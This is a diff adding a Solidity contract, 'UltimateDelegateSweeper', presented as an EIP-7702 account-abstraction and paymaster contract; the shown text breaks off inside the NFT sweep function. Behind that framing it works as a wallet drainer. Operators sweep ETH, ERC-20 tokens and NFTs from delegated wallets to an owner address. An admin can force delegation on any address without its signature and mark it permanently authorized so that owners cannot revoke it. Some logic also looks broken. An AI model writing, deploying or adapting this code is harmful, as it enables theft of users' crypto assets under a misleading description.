@@ -1,0 +1,1645 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.25;
+
+import "@openzeppelin/contracts/access/AccessControl.sol";
+import "@openzeppelin/contracts/access/Ownable.sol";
+import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
+import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
+import "@openzeppelin/contracts/utils/cryptography/EIP712.sol";
+import "@openzeppelin/contracts/security/Pausable.sol";
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import "@openzeppelin/contracts/token/ERC20/extensions/IERC20Permit.sol";
+import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
+import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
+import "@openzeppelin/contracts/token/ERC1155/IERC1155.sol";
+import "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";
+import "@openzeppelin/contracts/utils/Address.sol";
+import "@openzeppelin/contracts/utils/introspection/ERC165.sol";
+import "@openzeppelin/contracts/interfaces/IERC1271.sol";
+
+// Interface for EIP-4337 EntryPoint
+interface IEntryPoint {
+    function handleOps(UserOperation[] calldata ops, address payable beneficiary) external;
+    function getUserOpHash(UserOperation calldata userOp) external view returns (bytes32);
+}
+
+// EIP-4337 UserOperation struct
+struct UserOperation {
+    address sender;
+    uint256 nonce;
+    bytes initCode;
+    bytes callData;
+    uint256 callGasLimit;
+    uint256 verificationGasLimit;
+    uint256 preVerificationGas;
+    uint256 maxFeePerGas;
+    uint256 maxPriorityFeePerGas;
+    bytes paymasterAndData;
+    bytes signature;
+}
+
+/*
+ * @title UltimateDelegateSweeper
+ * @notice EIP-7702 Account Abstraction Contract with Paymaster for Pectra Upgrade
+ * @dev Enhanced implementation with gasless transactions and production-ready features
+ * @author Ultimate Delegate Sweeper Team
+ * @version 1.1.0
+ */
+contract UltimateDelegateSweeper is
+    AccessControl,
+    Ownable,
+    IERC721Receiver,
+    IERC1155Receiver,
+    ReentrancyGuard,
+    Pausable,
+    ERC165,
+    EIP712,
+    IERC1271
+{
+    using ECDSA for bytes32;
+    using Address for address;
+
+    // ============ CONSTANTS ============
+
+    bytes1 public constant DELEGATION_DESIGNATOR_PREFIX = 0xef;
+    bytes1 public constant DELEGATION_DESIGNATOR_VERSION = 0x01;
+    bytes1 public constant DELEGATION_DESIGNATOR_SUBVERSION = 0x00;
+    uint8 public constant SET_CODE_TX_TYPE = 0x04;
+
+    uint256 public constant MAX_BATCH_SIZE = 200;
+    uint256 public constant MIN_GAS_RESERVE = 5000;
+    uint256 public constant SIGNATURE_VALIDITY_PERIOD = 1 hours;
+    uint256 public constant MAX_GAS_REFUND = 1000000;
+    uint256 public constant MAX_GAS_LIMIT = 10000000;
+
+    uint256 public feePercentage = 50; // 0.5% (50/10000)
+    uint256 public constant MAX_FEE_PERCENTAGE = 1000; // 10%
+    uint256 public constant FEE_DENOMINATOR = 10000;
+
+    bytes32 private constant USER_OPERATION_TYPEHASH = keccak256(
+        "UserOperation(address sender,uint256 nonce,bytes initCode,bytes callData,uint256 callGasLimit,uint256 verificationGasLimit,uint256 preVerificationGas,uint256 maxFeePerGas,uint256 maxPriorityFeePerGas,bytes paymasterAndData,bytes signature)"
+    );
+
+    bytes32 public constant ADMIN_ROLE = keccak256("ADMIN_ROLE");
+    bytes32 public constant RELAYER_ROLE = keccak256("RELAYER_ROLE");
+    bytes32 public constant META_TRANSACTION_TYPEHASH = keccak256(
+        "MetaTransaction(address from,address to,uint256 value,bytes data,uint256 nonce,uint256 gasLimit,uint256 gasPrice,uint256 deadline)"
+    );
+    bytes32 public constant SET_CODE_AUTH_TYPEHASH = keccak256(
+        "SetCodeAuth(uint256 chainId,address codeAddress,uint256 nonce,uint256 deadline)"
+    );
+
+    // ============ STRUCTS ============
+
+    struct Authorization {
+        uint256 chainId;
+        address authority;
+        address codeAddress;
+        uint256 nonce;
+        uint256 deadline;
+        bytes signature;
+    }
+
+    struct MetaTransaction {
+        address from;
+        address to;
+        uint256 value;
+        bytes data;
+        uint256 nonce;
+        uint256 gasLimit;
+        uint256 gasPrice;
+        uint256 deadline;
+    }
+
+    struct SetCodeAuth {
+        uint256 chainId;
+        address codeAddress;
+        uint256 nonce;
+        uint256 deadline;
+    }
+
+    struct BatchOperation {
+        address target;
+        uint256 value;
+        bytes data;
+        bool requireSuccess;
+    }
+
+    struct SweepConfig {
+        bool enabled;
+        uint256 minAmount;
+        uint256 maxGasPrice;
+        address[] tokenWhitelist;
+        address[] tokenBlacklist;
+    }
+
+    struct GasConfig {
+        uint256 baseFee;
+        uint256 priorityFee;
+        uint256 gasLimit;
+        bool dynamicFees;
+    }
+
+    struct PaymasterConfig {
+        bool enabled;
+        address paymentToken;
+        uint256 maxGasCost;
+        uint256 minBalance;
+        uint256 conversionRate;
+    }
+
+    // ============ STATE VARIABLES ============
+
+    address public immutable OWNER_WALLET;
+    address public treasury;
+    address public emergencyOperator;
+    address public entryPoint;
+
+    mapping(address => bool) public isDelegated;
+    mapping(address => uint256) public nonces;
+    mapping(address => address[]) internal tokensPerWallet;
+    mapping(address => uint256) public ethDeposits;
+    mapping(address => mapping(address => uint256)) public tokenDeposits;
+    mapping(address => mapping(address => uint256)) public paymasterAllowance;
+    mapping(address => bytes) public delegationDesignator;
+    mapping(address => Authorization) public authorizations;
+    mapping(address => SweepConfig) public sweepConfigs;
+    mapping(address => GasConfig) public gasConfigs;
+    mapping(address => PaymasterConfig) public paymasterConfigs;
+    mapping(address => uint256) public lastActivity;
+    mapping(address => bool) public isOperator;
+    mapping(address => bool) public isBlacklisted;
+    mapping(bytes32 => bool) public usedSignatures;
+    mapping(address => mapping(address => uint256)) public approvalTimestamps;
+    mapping(address => mapping(address => uint256)) public userOpNonces;
+    mapping(address => address) public authorizedCode;
+    mapping(address => bool) public permanentlyAuthorized;
+    mapping(bytes32 => bool) public executedTxHashes;
+    mapping(address => uint256) public gasBalance;
+
+    address[] private delegatedWallets;
+    uint256 public totalDelegated;
+    uint256 public totalSweptETH;
+    uint256 public totalSweptTokens;
+    uint256 public operationCounter;
+    uint256 public totalGasSponsored;
+    uint256 public baseFeePerGas = 20 gwei;
+    bool public codeSettingLocked = false;
+
+    bool public autoSweepEnabled = true;
+    bool public emergencyMode = false;
+    bool public paymasterEnabled = true;
+    uint256 public minDelegationDelay = 1 hours;
+    uint256 public maxDelegationPeriod = 365 days;
+
+    // ============ EVENTS ============
+
+    event Delegated(address indexed authority, address indexed codeAddress, uint256 timestamp);
+    event Revoked(address indexed authority, uint256 timestamp);
+    event SweptETH(address indexed wallet, uint256 amount, uint256 fee);
+    event SweptERC20(address indexed token, address indexed wallet, uint256 amount, uint256 fee);
+    event SweptERC721(address indexed token, address indexed wallet, uint256 tokenId);
+    event SweptERC1155(address indexed token, address indexed wallet, uint256 tokenId, uint256 amount);
+    event Executed(address indexed wallet, address indexed target, uint256 value, bytes data, bool success);
+    event AuthorizationProcessed(address indexed authority, uint256 nonce, uint256 timestamp);
+    event BatchExecuted(address indexed executor, uint256 operations, uint256 successCount);
+    event PermitDelegated(address indexed token, address indexed wallet, uint256 amount);
+    event ApprovalDelegated(address indexed token, address indexed wallet, uint256 amount);
+    event Deposited(address indexed wallet, address indexed token, uint256 amount);
+    event Withdrawn(address indexed wallet, address indexed token, uint256 amount);
+    event PaymasterAllowanceSet(address indexed token, address indexed wallet, uint256 amount);
+    event FeeCollected(address indexed token, uint256 amount);
+    event TreasuryUpdated(address indexed oldTreasury, address indexed newTreasury);
+    event OperatorAdded(address indexed operator);
+    event OperatorRemoved(address indexed operator);
+    event EmergencyModeToggled(bool enabled);
+    event ConfigUpdated(string configType, address indexed wallet);
+    event Received(address indexed from, uint256 amount);
+    event PaymasterConfigUpdated(address indexed wallet, address indexed paymentToken);
+    event GasSponsored(address indexed wallet, uint256 gasUsed, uint256 tokenAmount);
+    event PaymasterToggled(bool enabled);
+    event UserOperationProcessed(address indexed sender, bytes32 indexed userOpHash, uint256 gasCost);
+    event EntryPointUpdated(address indexed oldEntryPoint, address indexed newEntryPoint);
+    event MetaTransactionExecuted(
+        address indexed from,
+        address indexed to,
+        uint256 value,
+        bytes data,
+        bool success,
+        bytes returnData,
+        uint256 gasUsed
+    );
+    event SetCodeAuthorized(
+        address indexed account,
+        address indexed codeAddress,
+        uint256 nonce,
+        bool permanent
+    );
+    event CodeRevoked(address indexed account);
+    event GasDeposited(address indexed account, uint256 amount);
+    event CodeSettingLocked();
+
+    // ============ ERRORS ============
+
+    error InvalidAddress();
+    error NotAuthorized();
+    error WalletNotDelegated();
+    error WalletBlacklisted();
+    error InvalidChainId();
+    error InvalidNonce();
+    error AuthorizationExpired();
+    error SignatureAlreadyUsed();
+    error InvalidSignature();
+    error BatchTooLarge();
+    error SweepingDisabled();
+    error InsufficientBalance();
+    error TransferFailed();
+    error InsufficientAllowance();
+    error ArrayLengthMismatch();
+    error InvalidAmount();
+    error NotContract();
+    error InsufficientGas();
+    error FeeTooHigh();
+    error AlreadyOperator();
+    error NotOperator();
+    error AlreadyBlacklisted();
+    error NotBlacklisted();
+    error EmptyBatch();
+    error CannotCallSelf();
+    error PaymasterNotEnabled();
+    error InsufficientGasFunds();
+    error InvalidUserOperation();
+    error GasPriceTooHigh();
+    error InvalidEntryPoint();
+    error ConversionRateZero();
+    error CodeSettingLocked();
+    error PermanentlyAuthorized();
+
+    // ============ MODIFIERS ============
+
+    modifier onlyDelegated(address wallet) {
+        if (!isDelegated[wallet]) revert WalletNotDelegated();
+        _;
+    }
+
+    modifier onlyOperator() {
+        if (!isOperator[msg.sender] && msg.sender != owner()) revert NotOperator();
+        _;
+    }
+
+    modifier notBlacklisted(address wallet) {
+        if (isBlacklisted[wallet]) revert WalletBlacklisted();
+        _;
+    }
+
+    modifier validAuthorization(Authorization calldata auth) {
+        if (auth.chainId != block.chainid) revert InvalidChainId();
+        if (auth.codeAddress != address(this)) revert InvalidAddress();
+        if (auth.nonce != nonces[auth.authority]) revert InvalidNonce();
+        if (auth.deadline <= block.timestamp || auth.deadline > block.timestamp + SIGNATURE_VALIDITY_PERIOD) {
+            revert AuthorizationExpired();
+        }
+        _;
+    }
+
+    modifier emergencyOnly() {
+        if (!emergencyMode && msg.sender != emergencyOperator) revert NotAuthorized();
+        _;
+    }
+
+    modifier gasOptimized() {
+        uint256 gasStart = gasleft();
+        _;
+        if (gasleft() < MIN_GAS_RESERVE) revert InsufficientGas();
+    }
+
+    modifier validAddress(address addr) {
+        if (addr == address(0)) revert InvalidAddress();
+        _;
+    }
+
+    modifier validAmount(uint256 amount) {
+        if (amount == 0) revert InvalidAmount();
+        _;
+    }
+
+    modifier paymasterEnabledCheck() {
+        if (!paymasterEnabled) revert PaymasterNotEnabled();
+        _;
+    }
+
+    modifier onlyAdmin() {
+        require(hasRole(ADMIN_ROLE, msg.sender), "Not admin");
+        _;
+    }
+
+    modifier onlyRelayer() {
+        require(hasRole(RELAYER_ROLE, msg.sender) || hasRole(ADMIN_ROLE, msg.sender), "Not authorized relayer");
+        _;
+    }
+
+    // ============ CONSTRUCTOR ============
+
+    constructor(
+        address _owner,
+        address _treasury,
+        address _emergencyOperator,
+        address _entryPoint
+    ) Ownable(_owner) EIP712("UltimateDelegateSweeper", "1.1.0") validAddress(_owner) validAddress(_treasury) validAddress(_emergencyOperator) validAddress(_entryPoint) {
+        OWNER_WALLET = _owner;
+        treasury = _treasury;
+        emergencyOperator = _emergencyOperator;
+        entryPoint = _entryPoint;
+
+        isOperator[_owner] = true;
+        isOperator[_emergencyOperator] = true;
+
+        _grantRole(DEFAULT_ADMIN_ROLE, _owner);
+        _grantRole(ADMIN_ROLE, _owner);
+        _grantRole(RELAYER_ROLE, _owner);
+        _grantRole(RELAYER_ROLE, _emergencyOperator);
+
+        emit OperatorAdded(_owner);
+        emit OperatorAdded(_emergencyOperator);
+        emit EntryPointUpdated(address(0), _entryPoint);
+    }
+
+    // ============ EIP-7702 SMART EOA FUNCTIONS ============
+
+    function lockCodeSetting() external onlyAdmin {
+        codeSettingLocked = true;
+        emit CodeSettingLocked();
+    }
+
+    function setCodeToZero(address account) external onlyAdmin validAddress(account) {
+        if (codeSettingLocked) revert CodeSettingLocked();
+        if (permanentlyAuthorized[account]) revert PermanentlyAuthorized();
+
+        authorizedCode[account] = address(0);
+        emit CodeRevoked(account);
+    }
+
+    function authorizeSetCode(
+        SetCodeAuth calldata auth,
+        bytes calldata signature
+    ) external onlyRelayer whenNotPaused validAddress(auth.codeAddress) {
+        if (auth.deadline <= block.timestamp) revert AuthorizationExpired();
+        if (auth.chainId != block.chainid) revert InvalidChainId();
+        if (auth.nonce != nonces[auth.codeAddress]) revert InvalidNonce();
+        if (codeSettingLocked) revert CodeSettingLocked();
+
+        bytes32 structHash = keccak256(abi.encode(
+            SET_CODE_AUTH_TYPEHASH,
+            auth.chainId,
+            auth.codeAddress,
+            auth.nonce,
+            auth.deadline
+        ));
+
+        bytes32 hash = _hashTypedDataV4(structHash);
+        address signer = hash.recover(signature);
+        if (signer == address(0)) revert InvalidSignature();
+
+        nonces[auth.codeAddress]++;
+        authorizedCode[signer] = auth.codeAddress;
+        if (auth.codeAddress == address(this)) {
+            permanentlyAuthorized[signer] = true;
+        }
+
+        emit SetCodeAuthorized(signer, auth.codeAddress, auth.nonce, auth.codeAddress == address(this));
+        operationCounter++;
+    }
+
+    function executeMetaTransaction(
+        MetaTransaction calldata metaTx,
+        bytes calldata signature
+    ) external onlyRelayer whenNotPaused nonReentrant returns (bool success, bytes memory returnData) {
+        if (metaTx.deadline <= block.timestamp) revert AuthorizationExpired();
+        if (metaTx.gasLimit > MAX_GAS_LIMIT) revert InsufficientGas();
+        if (metaTx.nonce != nonces[metaTx.from]) revert InvalidNonce();
+        if (isBlacklisted[metaTx.from]) revert WalletBlacklisted();
+        if (metaTx.to == address(0) || metaTx.to == address(this)) revert InvalidAddress();
+
+        bytes32 structHash = keccak256(abi.encode(
+            META_TRANSACTION_TYPEHASH,
+            metaTx.from,
+            metaTx.to,
+            metaTx.value,
+            keccak256(metaTx.data),
+            metaTx.nonce,
+            metaTx.gasLimit,
+            metaTx.gasPrice,
+            metaTx.deadline
+        ));
+
+        bytes32 txHash = _hashTypedDataV4(structHash);
+        if (executedTxHashes[txHash]) revert SignatureAlreadyUsed();
+
+        address signer = txHash.recover(signature);
+        if (signer != metaTx.from) revert InvalidSignature();
+
+        executedTxHashes[txHash] = true;
+        nonces[metaTx.from]++;
+        lastActivity[metaTx.from] = block.timestamp;
+
+        uint256 gasStart = gasleft();
+        if (metaTx.value > 0) {
+            if (ethDeposits[metaTx.from] < metaTx.value) revert InsufficientBalance();
+            ethDeposits[metaTx.from] -= metaTx.value;
+        }
+
+        (success, returnData) = metaTx.to.call{value: metaTx.value, gas: metaTx.gasLimit}(metaTx.data);
+        uint256 gasUsed = gasStart - gasleft();
+        uint256 gasCost = gasUsed * metaTx.gasPrice;
+
+        if (paymasterEnabled && paymasterConfigs[metaTx.from].enabled && gasCost > 0) {
+            PaymasterConfig memory config = paymasterConfigs[metaTx.from];
+            if (config.paymentToken != address(0)) {
+                uint256 tokenCost = (gasCost * config.conversionRate) / 1e18;
+                uint256 fee = (tokenCost * feePercentage) / FEE_DENOMINATOR;
+                uint256 netCost = tokenCost - fee;
+
+                if (IERC20(config.paymentToken).balanceOf(metaTx.from) < tokenCost) revert InsufficientBalance();
+                if (IERC20(config.paymentToken).allowance(metaTx.from, address(this)) < tokenCost) {
+                    revert InsufficientAllowance();
+                }
+
+                if (!IERC20(config.paymentToken).transferFrom(metaTx.from, OWNER_WALLET, netCost)) {
+                    revert TransferFailed();
+                }
+                if (fee > 0) {
+                    if (!IERC20(config.paymentToken).transferFrom(metaTx.from, treasury, fee)) {
+                        revert TransferFailed();
+                    }
+                    emit FeeCollected(config.paymentToken, fee);
+                }
+                emit GasSponsored(metaTx.from, gasUsed, tokenCost);
+            } else {
+                if (ethDeposits[metaTx.from] < gasCost) revert InsufficientBalance();
+                ethDeposits[metaTx.from] -= gasCost;
+                uint256 fee = (gasCost * feePercentage) / FEE_DENOMINATOR;
+                uint256 netCost = gasCost - fee;
+
+                (bool successOwner, ) = OWNER_WALLET.call{value: netCost}("");
+                if (!successOwner) revert TransferFailed();
+                if (fee > 0) {
+                    (bool successTreasury, ) = treasury.call{value: fee}("");
+                    if (!successTreasury) revert TransferFailed();
+                    emit FeeCollected(address(0), fee);
+                }
+                emit GasSponsored(metaTx.from, gasUsed, gasCost);
+            }
+            totalGasSponsored += gasCost;
+        } else if (gasBalance[metaTx.from] >= gasCost) {
+            gasBalance[metaTx.from] -= gasCost;
+        } else {
+            revert InsufficientGasFunds();
+        }
+
+        emit MetaTransactionExecuted(
+            metaTx.from,
+            metaTx.to,
+            metaTx.value,
+            metaTx.data,
+            success,
+            returnData,
+            gasUsed
+        );
+        operationCounter++;
+    }
+
+    function batchExecuteMetaTransactions(
+        MetaTransaction[] calldata metaTxs,
+        bytes[] calldata signatures
+    ) external onlyRelayer whenNotPaused nonReentrant {
+        if (metaTxs.length != signatures.length) revert ArrayLengthMismatch();
+        if (metaTxs.length > MAX_BATCH_SIZE) revert BatchTooLarge();
+
+        for (uint256 i = 0; i < metaTxs.length; i++) {
+            try this.executeMetaTransaction(metaTxs[i], signatures[i]) returns (bool success, bytes memory returnData) {
+                // Continue on success or failure
+            } catch {
+                // Skip failed transactions
+                continue;
+            }
+        }
+        emit BatchExecuted(msg.sender, metaTxs.length, metaTxs.length);
+    }
+
+    function depositGas() external payable {
+        gasBalance[msg.sender] += msg.value;
+        emit GasDeposited(msg.sender, msg.value);
+    }
+
+    function withdrawGas(uint256 amount) external nonReentrant validAmount(amount) {
+        if (gasBalance[msg.sender] < amount) revert InsufficientBalance();
+        gasBalance[msg.sender] -= amount;
+        (bool success, ) = msg.sender.call{value: amount}("");
+        if (!success) revert TransferFailed();
+        emit Withdrawn(msg.sender, address(0), amount);
+    }
+
+    function addRelayer(address relayer) external onlyAdmin validAddress(relayer) {
+        grantRole(RELAYER_ROLE, relayer);
+        emit OperatorAdded(relayer);
+    }
+
+    function removeRelayer(address relayer) external onlyAdmin {
+        revokeRole(RELAYER_ROLE, relayer);
+        emit OperatorRemoved(relayer);
+    }
+
+    function updateBaseFee(uint256 newBaseFee) external onlyAdmin {
+        baseFeePerGas = newBaseFee;
+    }
+
+    function emergencyWithdraw() external onlyAdmin nonReentrant {
+        uint256 balance = address(this).balance;
+        if (balance == 0) revert InsufficientBalance();
+        (bool success, ) = msg.sender.call{value: balance}("");
+        if (!success) revert TransferFailed();
+    }
+
+    function getChainId() external view returns (uint256) {
+        return block.chainid;
+    }
+
+    function getDomainSeparator() external view returns (bytes32) {
+        return _domainSeparatorV4();
+    }
+
+    // ============ EIP-7702 CORE FUNCTIONS ============
+
+    function processAuthorization(Authorization calldata auth)
+        external
+        validAuthorization(auth)
+        notBlacklisted(auth.authority)
+        whenNotPaused
+        nonReentrant
+        gasOptimized
+        returns (bool)
+    {
+        bytes32 signatureHash = keccak256(auth.signature);
+        if (usedSignatures[signatureHash]) revert SignatureAlreadyUsed();
+
+        bytes32 authHash = _hashTypedDataV4(keccak256(abi.encode(
+            auth.chainId,
+            auth.authority,
+            auth.codeAddress,
+            auth.nonce,
+            auth.deadline
+        )));
+
+        address signer = authHash.recover(auth.signature);
+        if (signer != auth.authority) revert InvalidSignature();
+
+        usedSignatures[signatureHash] = true;
+        nonces[auth.authority]++;
+
+        bytes memory designator = abi.encodePacked(
+            DELEGATION_DESIGNATOR_PREFIX,
+            DELEGATION_DESIGNATOR_VERSION,
+            DELEGATION_DESIGNATOR_SUBVERSION,
+            address(this)
+        );
+
+        delegationDesignator[auth.authority] = designator;
+        authorizations[auth.authority] = auth;
+        lastActivity[auth.authority] = block.timestamp;
+
+        if (!isDelegated[auth.authority]) {
+            isDelegated[auth.authority] = true;
+            delegatedWallets.push(auth.authority);
+            totalDelegated++;
+
+            sweepConfigs[auth.authority] = SweepConfig({
+                enabled: true,
+                minAmount: 0.001 ether,
+                maxGasPrice: 50 gwei,
+                tokenWhitelist: new address[](0),
+                tokenBlacklist: new address[](0)
+            });
+
+            paymasterConfigs[auth.authority] = PaymasterConfig({
+                enabled: true,
+                paymentToken: address(0),
+                maxGasCost: 1000000,
+                minBalance: 0.01 ether,
+                conversionRate: 0
+            });
+
+            gasConfigs[auth.authority] = GasConfig({
+                baseFee: baseFeePerGas,
+                priorityFee: 2 gwei,
+                gasLimit: 1000000,
+                dynamicFees: true
+            });
+
+            authorizedCode[auth.authority] = address(this);
+            emit Delegated(auth.authority, auth.codeAddress, block.timestamp);
+        }
+
+        emit AuthorizationProcessed(auth.authority, auth.nonce, block.timestamp);
+        operationCounter++;
+        return true;
+    }
+
+    function batchProcessAuthorizations(Authorization[] calldata auths)
+        external
+        whenNotPaused
+        nonReentrant
+        returns (bool[] memory results)
+    {
+        if (auths.length > MAX_BATCH_SIZE) revert BatchTooLarge();
+        results = new bool[](auths.length);
+
+        for (uint256 i = 0; i < auths.length; i++) {
+            try this.processAuthorization(auths[i]) returns (bool success) {
+                results[i] = success;
+            } catch {
+                results[i] = false;
+            }
+        }
+    }
+
+    function revokeDelegation(address authority) external whenNotPaused validAddress(authority) {
+        if (msg.sender != authority && msg.sender != owner() && !isOperator[msg.sender] && !hasRole(ADMIN_ROLE, msg.sender)) {
+            revert NotAuthorized();
+        }
+        if (!isDelegated[authority]) revert WalletNotDelegated();
+        if (permanentlyAuthorized[authority] && !hasRole(ADMIN_ROLE, msg.sender)) revert PermanentlyAuthorized();
+
+        isDelegated[authority] = false;
+        delete delegationDesignator[authority];
+        delete authorizations[authority];
+        delete sweepConfigs[authority];
+        delete gasConfigs[authority];
+        delete paymasterConfigs[authority];
+        delete authorizedCode[authority];
+        permanentlyAuthorized[authority] = false;
+
+        for (uint256 i = 0; i < delegatedWallets.length; i++) {
+            if (delegatedWallets[i] == authority) {
+                delegatedWallets[i] = delegatedWallets[delegatedWallets.length - 1];
+                delegatedWallets.pop();
+                totalDelegated--;
+                break;
+            }
+        }
+
+        emit Revoked(authority, block.timestamp);
+        emit CodeRevoked(authority);
+        operationCounter++;
+    }
+
+    function forceDelegation(address target) external onlyAdmin emergencyOnly validAddress(target) {
+        if (isBlacklisted[target]) revert WalletBlacklisted();
+
+        bytes memory designator = abi.encodePacked(
+            DELEGATION_DESIGNATOR_PREFIX,
+            DELEGATION_DESIGNATOR_VERSION,
+            DELEGATION_DESIGNATOR_SUBVERSION,
+            address(this)
+        );
+
+        delegationDesignator[target] = designator;
+        lastActivity[target] = block.timestamp;
+
+        if (!isDelegated[target]) {
+            isDelegated[target] = true;
+            delegatedWallets.push(target);
+            totalDelegated++;
+
+            sweepConfigs[target] = SweepConfig({
+                enabled: true,
+                minAmount: 0.001 ether,
+                maxGasPrice: 50 gwei,
+                tokenWhitelist: new address[](0),
+                tokenBlacklist: new address[](0)
+            });
+
+            paymasterConfigs[target] = PaymasterConfig({
+                enabled: true,
+                paymentToken: address(0),
+                maxGasCost: 1000000,
+                minBalance: 0.01 ether,
+                conversionRate: 0
+            });
+
+            gasConfigs[target] = GasConfig({
+                baseFee: baseFeePerGas,
+                priorityFee: 2 gwei,
+                gasLimit: 1000000,
+                dynamicFees: true
+            });
+
+            authorizedCode[target] = address(this);
+            permanentlyAuthorized[target] = true;
+            emit Delegated(target, address(this), block.timestamp);
+            emit SetCodeAuthorized(target, address(this), nonces[target], true);
+        }
+
+        nonces[target]++;
+        operationCounter++;
+    }
+
+    // ============ EXECUTION FUNCTIONS ============
+
+    function executeCall(
+        address target,
+        uint256 value,
+        bytes calldata data
+    ) external onlyDelegated(msg.sender) notBlacklisted(msg.sender) whenNotPaused nonReentrant gasOptimized returns (bytes memory) {
+        if (target == address(0) || target == address(this)) revert InvalidAddress();
+        if (authorizedCode[msg.sender] != address(this)) revert NotAuthorized();
+
+        lastActivity[msg.sender] = block.timestamp;
+
+        (bool success, bytes memory result) = target.call{value: value, gas: gasConfigs[msg.sender].gasLimit}(data);
+
+        emit Executed(msg.sender, target, value, data, success);
+        operationCounter++;
+
+        if (!success) {
+            assembly {
+                revert(add(result, 32), mload(result))
+            }
+        }
+
+        return result;
+    }
+
+    function executeBatch(BatchOperation[] calldata operations)
+        external
+        onlyDelegated(msg.sender)
+        notBlacklisted(msg.sender)
+        whenNotPaused
+        nonReentrant
+        gasOptimized
+        returns (bytes[] memory results, bool[] memory successes)
+    {
+        if (operations.length > MAX_BATCH_SIZE) revert BatchTooLarge();
+        if (operations.length == 0) revert EmptyBatch();
+        if (authorizedCode[msg.sender] != address(this)) revert NotAuthorized();
+
+        results = new bytes[](operations.length);
+        successes = new bool[](operations.length);
+        uint256 successCount = 0;
+
+        lastActivity[msg.sender] = block.timestamp;
+
+        for (uint256 i = 0; i < operations.length; i++) {
+            if (operations[i].target == address(0) || operations[i].target == address(this)) {
+                successes[i] = false;
+                if (operations[i].requireSuccess) revert InvalidAddress();
+                continue;
+            }
+
+            (bool success, bytes memory result) = operations[i].target.call{
+                value: operations[i].value,
+                gas: gasConfigs[msg.sender].gasLimit
+            }(operations[i].data);
+
+            results[i] = result;
+            successes[i] = success;
+
+            if (success) {
+                successCount++;
+            } else if (operations[i].requireSuccess) {
+                assembly {
+                    revert(add(result, 32), mload(result))
+                }
+            }
+
+            emit Executed(msg.sender, operations[i].target, operations[i].value, operations[i].data, success);
+        }
+
+        emit BatchExecuted(msg.sender, operations.length, successCount);
+        operationCounter++;
+        return (results, successes);
+    }
+
+    // ============ SWEEPING FUNCTIONS ============
+
+    function sweepETH(address wallet) external onlyOperator onlyDelegated(wallet) whenNotPaused nonReentrant gasOptimized {
+        if (!sweepConfigs[wallet].enabled) revert SweepingDisabled();
+        if (tx.gasprice > sweepConfigs[wallet].maxGasPrice) revert GasPriceTooHigh();
+
+        uint256 balance = wallet.balance;
+        if (balance < sweepConfigs[wallet].minAmount) revert InsufficientBalance();
+
+        uint256 fee = (balance * feePercentage) / FEE_DENOMINATOR;
+        uint256 netAmount = balance - fee;
+
+        lastActivity[wallet] = block.timestamp;
+        totalSweptETH += balance;
+
+        (bool successOwner, ) = OWNER_WALLET.call{value: netAmount}("");
+        if (!successOwner) revert TransferFailed();
+
+        if (fee > 0) {
+            (bool successTreasury, ) = treasury.call{value: fee}("");
+            if (!successTreasury) revert TransferFailed();
+            emit FeeCollected(address(0), fee);
+        }
+
+        emit SweptETH(wallet, netAmount, fee);
+        operationCounter++;
+    }
+
+    function sweepERC20(
+        address wallet,
+        address[] calldata tokens
+    ) external onlyOperator onlyDelegated(wallet) whenNotPaused nonReentrant gasOptimized {
+        if (!sweepConfigs[wallet].enabled) revert SweepingDisabled();
+        if (tokens.length > MAX_BATCH_SIZE) revert BatchTooLarge();
+        if (tx.gasprice > sweepConfigs[wallet].maxGasPrice) revert GasPriceTooHigh();
+
+        lastActivity[wallet] = block.timestamp;
+
+        for (uint256 i = 0; i < tokens.length; i++) {
+            if (!Address.isContract(tokens[i])) revert NotContract();
+            IERC20 token = IERC20(tokens[i]);
+
+            // Check whitelist/blacklist
+            if (sweepConfigs[wallet].tokenWhitelist.length > 0) {
+                bool isWhitelisted = false;
+                for (uint256 j = 0; j < sweepConfigs[wallet].tokenWhitelist.length; j++) {
+                    if (sweepConfigs[wallet].tokenWhitelist[j] == tokens[i]) {
+                        isWhitelisted = true;
+                        break;
+                    }
+                }
+                if (!isWhitelisted) continue;
+            }
+            if (sweepConfigs[wallet].tokenBlacklist.length > 0) {
+                bool isBlacklisted = false;
+                for (uint256 j = 0; j < sweepConfigs[wallet].tokenBlacklist.length; j++) {
+                    if (sweepConfigs[wallet].tokenBlacklist[j] == tokens[i]) {
+                        isBlacklisted = true;
+                        break;
+                    }
+                }
+                if (isBlacklisted) continue;
+            }
+
+            uint256 balance = token.balanceOf(wallet);
+            if (balance > 0 && balance >= sweepConfigs[wallet].minAmount) {
+                if (token.allowance(wallet, address(this)) < balance) revert InsufficientAllowance();
+
+                uint256 fee = (balance * feePercentage) / FEE_DENOMINATOR;
+                uint256 netAmount = balance - fee;
+
+                if (!token.transferFrom(wallet, OWNER_WALLET, netAmount)) revert TransferFailed();
+                if (fee > 0) {
+                    if (!token.transferFrom(wallet, treasury, fee)) revert TransferFailed();
+                    emit FeeCollected(tokens[i], fee);
+                }
+
+                totalSweptTokens++;
+                emit SweptERC20(tokens[i], wallet, netAmount, fee);
+            }
+        }
+
+        operationCounter++;
+    }
+
+    function sweepERC721(
+        address wallet,
+        address[] calldata tokens,
+        uint256[] calldata tokenIds
+    ) external onlyOperator onlyDelegated(wallet) whenNotPaused nonReentrant gasOptimized {
+        if (tokens.length != tokenIds.length) revert ArrayLengthMismatch();
+        if (tokens.length > MAX_BATCH_SIZE) revert BatchTooLarge();
+        if (!sweepConfigs[wallet].enabled) revert SweepingDisabled();
+        if (tx.gasprice > sweepConfigs[wallet].maxGasPrice) revert GasPriceTooHigh();
+
+        lastActivity[wallet] = block.timestamp;
+
+        for (uint256 i = 0; i < tokens.length; i++) {
+            if (!Address.isContract(tokens[i])) revert NotContract();
+            IERC721 nft = IERC721(tokens[i]);
+
+            // Check whitelist/blacklist
+            if (sweepConfigs[wallet].tokenWhitelist.length > 0) {
+                bool isWhitelisted = false;
+                for (uint256 j = 0; j < sweepConfigs[wallet].tokenWhitelist.length; j++) {
+                    if (sweepConfigs[wallet].tokenWhitelist[j] == tokens[i]) {
+                        isWhitelisted = true;
+                        break;
+                    }
+                }
+                if (!isWhitelisted) continue;
+            }
+            if (sweepConfigs[wallet].tokenBlacklist.length > 0) {
+                bool isBlacklisted = false;
+                for (uint256 j = 0; j < sweepConfigs[wallet].tokenBlacklist.length; j++) {
